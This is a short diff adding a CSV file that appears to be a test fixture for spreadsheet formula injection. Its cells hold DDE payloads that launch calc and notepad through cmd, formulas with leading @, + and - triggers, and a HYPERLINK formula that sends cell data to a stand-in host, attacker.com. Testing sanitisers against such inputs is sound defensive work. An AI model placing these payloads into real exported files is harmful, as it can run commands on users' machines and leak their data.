@@ -1,0 +1,4 @@
+date,sales,formula_cmd,formula_sum,formula_plus,formula_minus,formula_hyperlink
+2023-01-01,100,=cmd|' /C calc'!A0,@SUM(1+1),+500,-1000,"=HYPERLINK(""http://attacker.com/leak?data=""&A2)"
+2023-01-02,150,"=DDE(""cmd"";""/C calc"";""__DdeLink__"")",@AVERAGE(B1:B2),+250,-50,=1+1
+2023-01-03,200,=cmd|' /C notepad'!A0,"@MAX(10,20)",+99,-1,safe_val
